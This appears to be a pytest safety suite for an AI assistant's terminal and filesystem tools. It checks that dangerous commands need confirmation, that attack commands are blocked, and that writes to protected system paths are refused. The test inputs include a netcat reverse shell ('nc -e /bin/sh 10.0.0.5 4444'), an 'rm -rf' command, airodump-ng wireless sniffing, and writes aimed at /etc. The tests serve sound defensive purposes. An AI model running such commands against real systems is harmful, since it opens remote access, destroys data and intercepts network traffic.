"""Safety tests: dangerous commands are gated, attacks are blocked, and
protected filesystem paths are refused."""

from __future__ import annotations

import pytest

from tools import build_registry
from tools.filesystem import is_protected, normalize_path
from tools.terminal import DANGEROUS_PATTERNS, TerminalTool


# ------------------------------------------------------------- terminal
@pytest.mark.asyncio
async def test_dangerous_command_requires_confirmation(tmp_db):
    tool = TerminalTool()
    result = await tool.execute(command="rm -rf /home/me/something")
    assert result["success"] is False
    assert result["requires_confirmation"] is True


@pytest.mark.asyncio
async def test_blocked_command_is_refused(tmp_db):
    tool = TerminalTool()
    result = await tool.execute(command="airodump-ng wlan0")
    assert result["success"] is False
    assert "requires_confirmation" not in result
    assert "blocked" in result["error"].lower()


@pytest.mark.asyncio
async def test_blocked_patterns_never_run_via_registry(tmp_db):
    registry = build_registry(tmp_db)
    result = await registry.execute("terminal", {"command": "nc -e /bin/sh 10.0.0.5 4444"})
    assert result.success is False


@pytest.mark.asyncio
async def test_safe_command_runs(tmp_db):
    tool = TerminalTool()
    result = await tool.execute(command="printf 'jarvis-ok'")
    assert result["success"] is True
    assert "jarvis-ok" in result["stdout"]


@pytest.mark.asyncio
async def test_empty_command_rejected():
    tool = TerminalTool()
    result = await tool.execute(command="   ")
    assert result["success"] is False


def test_sudo_pattern_is_caught():
    assert any("sudo" in p for p in DANGEROUS_PATTERNS)


# ----------------------------------------------------------- filesystem
def test_protected_paths():
    assert is_protected("/etc/passwd") is True
    assert is_protected("/etc/shadow") is True
    assert is_protected("/usr/lib") is True
    assert is_protected("/boot/efi") is True
    assert is_protected("/home/me/notes.txt") is False
    assert is_protected(str(normalize_path("/etc")) + "/anything") is True


@pytest.mark.asyncio
async def test_write_to_protected_path_refused(tmp_db):
    from tools.filesystem import WriteFileTool

    tool = WriteFileTool()
    result = await tool.execute(path="/etc/hacked.txt", content="pwned")
    assert result["success"] is False
    assert "protected" in result["error"].lower()


@pytest.mark.asyncio
async def test_delete_file_requires_confirmation(tmp_db):
    registry = build_registry(tmp_db)
    result = await registry.execute("delete_file", {"path": str(tmp_db.store.db_path)})
    assert result.confirmation_required is True
    assert result.success is False


@pytest.mark.asyncio
async def test_filesystem_write_then_read_roundtrip(tmp_path, tmp_db):
    from tools.filesystem import ReadFileTool, WriteFileTool

    target = tmp_path / "data.txt"
    writer = WriteFileTool()
    result = await writer.execute(path=str(target), content="hello world")
    assert result["success"] is True

    reader = ReadFileTool()
    result = await reader.execute(path=str(target))
    assert result["content"] == "hello world"


def test_dangerous_patterns_cover_fork_bomb_and_dd():
    assert any(":(){" in p for p in DANGEROUS_PATTERNS)
    assert any("dd " in p for p in DANGEROUS_PATTERNS)
